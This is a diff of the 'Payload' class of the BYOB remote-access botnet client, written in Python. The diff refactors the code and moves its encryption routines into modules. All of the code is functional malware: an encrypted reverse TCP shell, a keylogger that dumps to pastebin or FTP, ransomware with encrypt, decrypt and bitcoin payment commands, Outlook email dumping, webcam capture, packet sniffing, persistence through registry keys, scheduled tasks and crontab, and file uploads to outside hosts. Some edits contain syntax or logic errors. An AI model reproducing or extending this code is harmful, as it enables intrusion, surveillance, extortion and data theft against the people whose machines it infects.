@@ -51,8 +51,9 @@ if os.name is 'nt':
     import pythoncom
 
 # byob
-import util
-import crypto
+    from modules import *
+else:
+    from . import *
 
 
 class PayloadError(Exception):
@@ -66,19 +67,19 @@ class Payload():
     _debug   = bool()
     _abort   = bool()
 
-    def _init__(self, config=None, debug=True):
+    def __init__(self, config=None, debug=True):
         """
         create a Payload instance
         """
-        self.jobs      = Queue.Queue()
-        self.flags     = {'connection': threading.Event(), 'mode': threading.Event(), 'prompt': threading.Event()}
-        self.workers   = collections.OrderedDict()
-        self.session   = collections.OrderedDict()
-        self.info      = collections.OrderedDict()
-        self.commands  = self.commands()
+        self._jobs      = Queue.Queue()
+        self._flags     = {'connection': threading.Event(), 'mode': threading.Event(), '_prompt': threading.Event()}
+        self._workers   = {}
+        self._session   = {}
+        self.info       = util.system_info()
+        self.commands   = self._commands()
 
 
-    def commands(self):
+    def _commands(self):
         commands = {}
         for cmd in vars(Payload):
             if hasattr(vars(Payload)[cmd], 'command') and getattr(vars(Payload)[cmd], 'command'):
@@ -93,43 +94,46 @@ class Payload():
         return commands
     
 
-    def send(self, **kwargs):
+    def _send(self, **kwargs):
         try:
-            if self.flags['connection'].wait(timeout=1.0):
+            if self._flags['connection'].wait(timeout=1.0):
                 if kwargs.get('result'):
                     buff = kwargs.get('result')
                     kwargs.update({'result': buff[:48000]})
-                data = self.aes_encrypt(json.dumps(kwargs), self.session['key'])
-                self.session['socket'].send(struct.pack('L', len(data)) + data)
+                data = crypto.encrypt(json.dumps(kwargs), self._session['key'])
+                self._session['socket'].send(struct.pack('L', len(data)) + data)
                 if len(buff[48000:]):
                     kwargs.update({'result': buff[48000:]})
-                    return self.send(**kwargs)
+                    return self._send(**kwargs)
             else:
                 util.debug("connection timed out")
         except Exception as e:
-            util.debug('{} error: {}'.format(self.send.func_name, str(e)))
+            util.debug('{} error: {}'.format(self._send.func_name, str(e)))
 
 
-    def recv(self, sock=None):
-        if not sock:
-            sock = self.session['socket']
-        header_size = struct.calcsize('L')
-        header = sock.recv(header_size)
-        msg_len = struct.unpack('L', header)[0]
-        data = ''
-        while len(data) < msg_len:
-            try:
-                data += sock.recv(1)
-            except (socket.timeout, socket.error):
-                break
-        if data and bytes(data):
-            try:
-                text = self.aes_decrypt(data, self.session['key'])
-                task = json.loads(text)
-                return task
-            except Exception as e2:
-                util.debug('{} error: {}'.format(self.recv.func_name, str(e2)))
-
+    def _recv(self, sock=None):
+        try:
+            if not sock:
+                sock = self._session['socket']
+            header_size = struct.calcsize('L')
+            header = sock.recv(header_size)
+            msg_len = struct.unpack('L', header)[0]
+            data = ''
+            while len(data) < msg_len:
+                try:
+                    data += sock.recv(1)
+                except (socket.timeout, socket.error):
+                    break
+            if data and bytes(data):
+                try:
+                    text = crypto.decrypt(data, self._session['key'])
+                    task = json.loads(text)
+                    return task
+                except Exception as e2:
+                    util.debug('{} error: {}'.format(self._recv.func_name, str(e2)))
+        except Exception as e:
+            util.debug("{} error: {}".format(self._recv.func_name, str(e)))
+            
 
     def _connect_api(self, *args, **kwargs):
         ip   = socket.gethostbyname(socket.gethostname())
@@ -156,13 +160,13 @@ class Payload():
         return ip, port
 
 
-    def _connect_direct(self, **kwargs):
+    def _connect(self, **kwargs):
         try:
-            host, port = self.addr(**kwargs)
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((host, port))
+            addr = ('localhost', 1337) if not len(kwargs) else self._connect_api(**kwargs)
+            sock.connect(addr)
             sock.setblocking(True)
-            self.flags['connection'].set()
+            self._flags['connection'].set()
             return sock
         except Exception as e:
             util.debug("{} error: {}".format(self.connect.func_name, str(e)))
@@ -170,27 +174,27 @@ class Payload():
 
 
     @util.threaded
-    def prompt(self, *args, **kwargs):
-        self.flags['prompt'].set()
+    def _prompt(self, *args, **kwargs):
+        self._flags['_prompt'].set()
         while True:
             try:
-                self.flags['prompt'].wait()
-                self.send(**{'id': '0'*64, 'client': self.info['uid'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
-                self.flags['prompt'].clear()
+                self._flags['_prompt'].wait()
+                self._send(**{'id': '0'*64, 'client': self.info['uid'], 'command': '_prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
+                self._flags['_prompt'].clear()
             except Exception as e:
-                util.debug("{} error: {}".format(self.prompt.func_name, str(e)))
-                self.flags['prompt'].clear()
+                util.debug("{} error: {}".format(self._prompt.func_name, str(e)))
+                self._flags['_prompt'].clear()
 
 
-    def session_id(self):
+    def _session_id(self):
         try:
-            if self.flags['connection'].wait(timeout=3.0):
-                self.session['socket'].sendall(self.aes_encrypt(json.dumps(self.info), self.session['key']) + '\n')
+            if self._flags['connection'].wait(timeout=3.0):
+                self._session['socket'].sendall(crypto.encrypt(json.dumps(self.info), self._session['key']) + '\n')
                 buf      = ""
                 attempts = 1
                 while '\n' not in buf:
                     try:
-                        buf += self.session['socket'].recv(1024)
+                        buf += self._session['socket'].recv(1024)
                     except (socket.error, socket.timeout):
                         if attempts <= 3:
                             util.debug('Attempt %d failed - no Session ID received from server\nRetrying...' % attempts)
@@ -199,140 +203,33 @@ class Payload():
                         else:
                             break
                 if buf:
-                    return self.aes_decrypt(buf.rstrip(), self.session['key']).strip().rstrip()
+                    return crypto.decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
             else:
-                util.debug("{} timed out".format(self.session_id.func_name))
+                util.debug("{} timed out".format(self._session_id.func_name))
         except Exception as e:
-            util.debug("{} error: {}".format(self.session_id.func_name, str(e)))
-        return self.restart(self.session_id.func_name)
-
-
-    def session_key(self):
-        try:
-            if self.flags['connection'].wait(timeout=3.0):
-                g  = 2
-                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
-                xA = pow(g, a, p)
-                self.session['socket'].send(Crypto.Util.number.long_to_bytes(xA))
-                xB = Crypto.Util.number.bytes_to_long(self.session['socket'].recv(256))
-                x  = pow(xB, a, p)
-                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
-            else:
-                util.debug("{} timed out".format(self.session_key.func_name))
-        except Exception as e:
-            util.debug("{} error: {}\nRestarting in 5 seconds...".format(self.session_key.func_name, str(e)))
-        return self.restart(self.session_key.func_name)
+            util.debug("{} error: {}".format(self._session_id.func_name, str(e)))
+        return self.restart(self._session_id.func_name)
 
 
     @util.threaded
-    @util.config(flag=threading.Event())
-    def task_manager(self):
+    def _manager(self):
         try:
             while True:
                 if self.abort:
                     break
                 else:
-                    self.task_manager.flag.wait()
-                    jobs = self.workers.items()
+                    jobs = self._workers.items()
                     for task, worker in jobs:
                         if not worker.is_alive():
-                            dead = self.workers.pop(task, None)
+                            dead = self._workers.pop(task, None)
                             del dead
                     time.sleep(1)
         except Exception as e:
-            util.debug('{} error: {}'.format('TaskManager', str(e)))
+            util.debug('{} error: {}'.format(self._manager.func_name, str(e)))
 
-    def diffiehellman(connection):
-        """
-        Diffie-Hellman key exchange for secure shared secret key (even on monitored networks)
-        """
-        if isinstance(connection, socket.socket):
-            try:
-                g  = 2
-                p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
-                a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
-                xA = pow(g, a, p)
-                connection.send(Crypto.Util.number.long_to_bytes(xA))
-                xB = Crypto.Util.number.bytes_to_long(connection.recv(256))
-                x  = pow(xB, a, p)
-                return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
-            except Exception as e:
-                util.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
-        else:
-            util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))
 
-    def encrypt_aes(data, key):
-        """
-        Encrypt data with 256-bit key using AES cipher in authenticated OCB mode
-        """
-        try:
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
-            ciphertext, tag = cipher.encrypt_and_digest(data)
-            output = b''.join((cipher.nonce, tag, ciphertext))
-            return base64.b64encode(output)
-        except Exception as e:
-            util.debug("{} error: {}".format(encrypt.func_name, str(e)))
+    # commands
 
-    def decrypt_aes(data, key):
-        """
-        Decrypt data encrypted with 256-bit key using AES cipher in authenticated OCB mode
-        """
-        try:
-            data = cStringIO.StringIO(base64.b64decode(data))
-            nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
-            cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
-            return cipher.decrypt_and_verify(ciphertext, tag)
-        except Exception as e1:
-            util.debug("{} error: {}".format(decrypt.func_name, str(e1)))
-            try:
-                return cipher.decrypt(ciphertext)
-            except Exception as e2:
-                return "{} error: {}".format(decrypt.func_name, str(e2))
-
-    def encrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
-        """
-        Encrypt data with 128-bit key using XOR cipher
-        """
-        data    = bytes(data) + (int(block_size) - len(bytes(data)) % int(block_size)) * bytes(padding)
-        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-        vector  = os.urandom(8)
-        result  = [vector]
-        for block in blocks:
-            block   = bytes().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, block))
-            v0, v1  = struct.unpack("!2L", block)
-            k       = struct.unpack("!4L", key[:key_size])
-            sum, delta, mask = 0L, 0x9e3779b9L, 0xffffffffL
-            for round in range(num_rounds):
-                v0  = (v0 + (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-                sum = (sum + delta) & mask
-                v1  = (v1 + (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-            output  = vector = struct.pack("!2L", v0, v1)
-            result.append(output)
-        return base64.b64encode(bytes().join(result))
-
-    def decrypt_xor(data, key, block_size=8, key_size=16, num_rounds=32, padding='\x00'):
-        """
-        Decrypt data encrypted with 128-bit key using XOR cipher
-        """
-        data    = base64.b64decode(data)
-        blocks  = [data[i * block_size:((i + 1) * block_size)] for i in range(len(data) // block_size)]
-        vector  = blocks[0]
-        result  = []
-        for block in blocks[1:]:
-            v0, v1 = struct.unpack("!2L", block)
-            k = struct.unpack("!4L", key[:key_size])
-            delta, mask = 0x9e3779b9L, 0xffffffffL
-            sum = (delta * num_rounds) & mask
-            for round in range(num_rounds):
-                v1 = (v1 - (((v0 << 4 ^ v0 >> 5) + v0) ^ (sum + k[sum >> 11 & 3]))) & mask
-                sum = (sum - delta) & mask
-                v0 = (v0 - (((v1 << 4 ^ v1 >> 5) + v1) ^ (sum + k[sum & 3]))) & mask
-            decode = struct.pack("!2L", v0, v1)
-            output = str().join(chr(ord(x) ^ ord(y)) for x, y in zip(vector, decode))
-            vector = block
-            result.append(output)
-        return str().join(result).rstrip(padding)
 
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
     def cd(self, path='.'):
@@ -499,16 +396,18 @@ class Payload():
         shutdown the current connection and reset session
         """
         try:
-            self.flags['connection'].clear()
-            self.flags['prompt'].clear()
-            self.session['socket'].shutdown(socket.SHUT_RDWR)
-            self.session['socket'].close()
-            self.session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.session['id'] = str()
-            self.session['key'] = str()
-            self.session['public_key'] = str()
-            workers = self.workers.keys()
-            for worker in workers:
+            self._flags['connection'].clear()
+            self._flags['_prompt'].clear()
+            if 'socket' in self._session:
+                if isinstance(self._session['socket'], socket.socket):
+                    self._session['socket'].shutdown(socket.SHUT_RDWR)
+                    self._session['socket'].close()
+            self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self._session['id'] = str()
+            self._session['key'] = str()
+            self._session['public_key'] = str()
+            _workers = self._workers.keys()
+            for worker in _workers:
                 try:
                     self.stop(worker)
                 except Exception as e2:
@@ -527,7 +426,7 @@ class Payload():
                 return json.dumps({self.commands[c]['usage']: self.commands[c]['description'] for c in self.commands})
             except Exception as e1:
                 util.debug("{} error: {}".format(self.help.func_name, str(e1)))
-        elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
+        elif hasattr(self, str(cmd)) and '_prompt' not in cmd:
             try:
                 return json.dumps({self.commands[cmd]['usage']: self.commands[cmd]['description']})
             except Exception as e2:
@@ -544,7 +443,7 @@ class Payload():
         try:
             attribute = str(attribute)
             if 'jobs' in attribute:
-                return json.dumps({a: util.status(self.workers[a].name) for a in self.workers if self.workers[a].is_alive()})
+                return json.dumps({a: util.status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
             elif 'privileges' in attribute:
                 return json.dumps({'username': self.info.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
             elif 'info' in attribute:
@@ -566,7 +465,7 @@ class Payload():
             else:
                 return self.show.usage
         except Exception as e:
-            util.debug("'{}' error: {}".format(self.workers.func_name, str(e)))
+            util.debug("'{}' error: {}".format(self._workers.func_name, str(e)))
 
 
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
@@ -575,8 +474,8 @@ class Payload():
         stop a running job
         """
         try:
-            if target in self.workers:
-                _ = self.workers.pop(target, None)
+            if target in self._workers:
+                _ = self._workers.pop(target, None)
                 del _
                 return "Job '{}' was stopped.".format(target)
             else:
@@ -593,9 +492,16 @@ class Payload():
         if 'portscan' not in globals():
             return "Error: missing module 'portscan'"
         try:
-            args = str(args).split()
-            host = [i for i in args if util.ipv4(i)][0] if len([i for i in args if util.ipv4(i)]) else self.info.get('local')
-            return self.portscan_network(host) if 'network' in args else self.portscan_host(host)
+            mode, _, target = str(args).partition(' ')
+            if target:
+                if not util.ipv4(target):
+                    return "Error: invalid IP address '%s'" % target
+            else:
+                target = socket.gethostbyname(socket.gethostname())
+            if hasattr(portscan, mode):
+                return getattr(portscan, mode)(target)
+            else:
+                return "Error: invalid mode '%s'" % mode
         except Exception as e:
             util.debug("{} error: {}".format(self.portscan.func_name, str(e)))
 
@@ -622,26 +528,28 @@ class Payload():
         """
         if 'outlook' not in globals():
             return "Error: missing module 'outlook'"
-        if not args:
+        elif not args:
             try:
-                if not outlook.installed()
+                if not outlook.installed():
                     return "Error: Outlook not installed on this host"
+                else:
+                    return "Outlook is installed on this host"
             except: pass
         else:
             try:
                 mode, _, arg   = str(args).partition(' ')
-                if hasattr(self, '_email_%s' % mode):
+                if hasattr(outlook % mode):
                     if 'dump' in mode or 'upload' in mode:
-                        self.workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
-                        self.workers['outlook'].daemon = True
-                        self.workers['outlook'].start()
+                        self._workers['outlook'] = threading.Thread(target=getattr(outlook, mode), kwargs={'n': arg}, name=time.time())
+                        self._workers['outlook'].daemon = True
+                        self._workers['outlook'].start()
                         return "Dumping emails from Outlook inbox"
                     elif hasattr(outlook, mode):
                         return getattr(outlook, mode)()
                     else:
                         return "Error: invalid mode '%s'" % mode
                 else:
-                    return "usage: email <dump/search> [ftp/pastebin]"
+                    return "usage: outlook [mode]\n    mode: count, dump, search, results"
             except Exception as e:
                 util.debug("{} error: {}".format(self.email.func_name, str(e)))
 
@@ -653,35 +561,34 @@ class Payload():
         """
         if 'ransom' not in globals():
             return "Error: missing module 'ransom'"
-        if not args:
+        elif not args:
             return "\tusage: ransom <encrypt/decrypt> [path]"
-        cmd, _, action = str(args).partition(' ')
-        if 'payment' in cmd:
-            try:
-                payment = self.resource('api bitcoin ransom_payment')
-                return ransom.payment(payment)
-            except:
-                return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
-        elif 'decrypt' in cmd:
-            return ransom.decrypt_threader(action)
-        elif 'encrypt' in cmd:
-            reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
-            return ransom.encrypt_threader(action)
         else:
-            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
+            cmd, _, action = str(args).partition(' ')
+            if 'payment' in cmd:
+                try:
+                    return ransom.payment(action)
+                except:
+                    return "{} error: {}".format(Payload._ransom_payment.func_name, "bitcoin wallet required for ransom payment")
+            elif 'decrypt' in cmd:
+                return ransom.decrypt_threader(action)
+            elif 'encrypt' in cmd:
+                reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
+                return ransom.encrypt_threader(action)
+            else:
+                return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
 
 
-    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <path>')
+    @util.config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
     def upload(self, args):
         """
-        upload file to imgur, pastebin, or ftp server - args: (ftp, imgur, pastebin) file
+        upload file to imgur, pastebin, or ftp server - mode: ftp, imgur, pastebin
         """
         try:
             mode, _, source = str(args).partition(' ')
-            target  = '_upload_{}'.format(mode)
-            if not source or not hasattr(self, target):
+            if not source or not hasattr(util, mode):
                 return self.upload.usage
-            return getattr(self, target)(source)
+            return getattr(util, mode)(source)
         except Exception as e:
             util.debug("{} error: {}".format(self.upload.func_name, str(e)))
 
@@ -692,10 +599,10 @@ class Payload():
         stream the webcam or capture image/video - args: (image, stream, video)
         """
         try:
-            if not args:
-                result = self.webcam.usage
-            elif 'webcam' not in globals():
+            if 'webcam' not in globals():
                 return "Error: missing module 'webcam'"
+            elif not args:
+                result = self.webcam.usage
             else:
                 args = str(args).split()
                 if 'stream' in args:
@@ -754,22 +661,23 @@ class Payload():
 
 
     @util.config(platforms=['win32','linux2','darwin'], max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger start/stop/dump/status')
-    def keylogger(self, *args, **kwargs):
+    def keylogger(self, mode=None):
         """
-        log user keystrokes - (auto, run, stop, dump, status)
+        log user keystrokes - mode; auto, run, stop, dump, status
         """
         if 'keylogger' not in globals():
             return "Error: missing module 'keylogger'"
-        mode = args[0] if args else None
-        if not mode:
-            if 'keylogger' not in self.workers:
+        elif not mode:
+            return keylogger.status()
+        elif not mode:
+            if 'keylogger' not in self._workers:
                 return keylogger.usage
             else:
                 return keylogger.status()
         else:
             if 'run' in mode:
-                if 'keylogger' not in self.workers:
-                    keylogger.workers['keylogger'] = keylogger.run()
+                if 'keylogger' not in self._workers:
+                    keylogger._workers['keylogger'] = keylogger.run()
                     return keylogger.status()
                 else:
                     return keylogger.status()
@@ -782,7 +690,7 @@ class Payload():
                 except: pass
                 return keylogger.status()
             elif 'auto' in mode:
-                self.workers['keylogger'] = keylogger.auto()
+                self._workers['keylogger'] = keylogger.auto()
                 return keylogger.status()
             elif 'dump' in mode:
                 result = util.pastebin(keylogger._buffer) if not 'ftp' in mode else util.ftp(keylogger._buffer)
@@ -797,7 +705,7 @@ class Payload():
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='persistence add/remove [method]')
     def persistence(self, args=None):
         """
-        persistence methods - all, registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
+        establish persistence - methods: registry_key, scheduled_task, launch_agent, crontab_job, startup_file, hidden_file
         """
         try:
             if not 'persistence' in globals():
@@ -826,22 +734,23 @@ class Payload():
         try:
             if 'packetsniffer' not in globals():
                 return "Error: missing module 'packetsniffer'"
-            mode   = None
-            length = None
-            cmd, _, action = str(args).partition(' ')
-            for arg in action.split():
-                if arg.isdigit():
-                    length = int(arg)
-                elif arg in ('ftp','pastebin'):
-                    mode   = arg
-            self.workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
-            return 'Capturing network traffic for {} seconds'.format(duration)
+            else:
+                mode   = None
+                length = None
+                cmd, _, action = str(args).partition(' ')
+                for arg in action.split():
+                    if arg.isdigit():
+                        length = int(arg)
+                    elif arg in ('ftp','pastebin'):
+                        mode   = arg
+                self._workers[self.packetsniffer.func_name] = packetsniffer(mode, seconds=length)
+                return 'Capturing network traffic for {} seconds'.format(duration)
         except Exception as e:
-            return "{} error: {}".format(self.packetsniffer.func_name, str(e))
+            util.debug("{} error: {}".format(self.packetsniffer.func_name, str(e)))
 
 
-    @util.config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='ps <mode> [args]')
-    def ps(self, args=None):
+    @util.config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode>s')
+    def process(self, args=None):
         """
         process utilities - mode: block, list, monitor, kill, search
         """
@@ -855,9 +764,9 @@ class Payload():
                 if hasattr(process, cmd):
                     return getattr(process, cmd)(action) if action else getattr(process, cmd)()
                 else:
-                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\targs: name".format(self.ps.usage)
+                    return "usage: {}\n\tmode: block, list, search, kill, monitor\n\t".format(self.ps.usage)
         except Exception as e:
-            return "{} error: {}".format(self.ps.func_name, str(e))
+            util.debug("{} error: {}".format(self.process.func_name, str(e)))
 
 
     @util.config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
@@ -892,11 +801,11 @@ class Payload():
         send encrypted shell back to server via outgoing TCP connection
         """
         try:
-            self.workers[self.prompt.func_name] = self.prompt()
+            self._workers[self._prompt.func_name] = self._prompt()
             while True:
-                if self.flags['connection'].wait(timeout=1.0):
-                    if not self.flags['prompt'].is_set():
-                        task = self.recv()
+                if self._flags['connection'].wait(timeout=1.0):
+                    if not self._flags['_prompt'].is_set():
+                        task = self._recv()
                         if isinstance(task, dict):
                             cmd, _, action = [i.encode() for i in task['command'].partition(' ')]
                             try:
@@ -904,10 +813,10 @@ class Payload():
                             except Exception as e1:
                                 result  = "{} error: {}".format(self.reverse_tcp_shell.func_name, str(e1))
                             task.update({'result': result})
-                            self.send(**task)
-                            if cmd and cmd in self.flags['tasks'] and 'PRIVATE KEY' not in task['command']:
+                            self._send(**task)
+                            if cmd and cmd in self._flags['tasks'] and 'PRIVATE KEY' not in task['command']:
                                 self.task_save(task, result)
-                        self.flags['prompt'].set()
+                        self._flags['_prompt'].set()
                 else:
                     util.debug("Connection timed out")
                     break
@@ -921,9 +830,9 @@ class Payload():
         connect to server and start new session
         """
         try:
-            self.session['socket'] = self._connect_api(**kwargs) if len(kwargs) else self._connect_direct()
-            self.session['key']    = self.session_key()
-            self.session['id']     = self.session_id()
+            self._session['socket'] = self._connect(**kwargs)
+            self._session['key']    = crypto.diffiehellman(self._session['socket'])
+            self._session['id']     = self._session_id()
             return True
         except Exception as e:
             util.debug("{} error: {}".format(self.connect.func_name, str(e)))
@@ -936,9 +845,8 @@ class Payload():
         """
         try:
             if self.connect(**kwargs):
-                self.workers[self.task_manager.func_name]     = self.task_manager()
-                self.workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
-                
+                self._workers[self._manager.func_name] = self._manager()
+                self._workers[self.reverse_tcp_shell.func_name] = self.reverse_tcp_shell()
             else:
                 util.debug("connection timed out")
         except Exception as e:
@@ -948,7 +856,7 @@ class Payload():
 
 
 def main(*args, **kwargs):
-    payload = Payload(**kwargs)
+    payload = Payload()
     payload.run(**kwargs)
     return payload
 
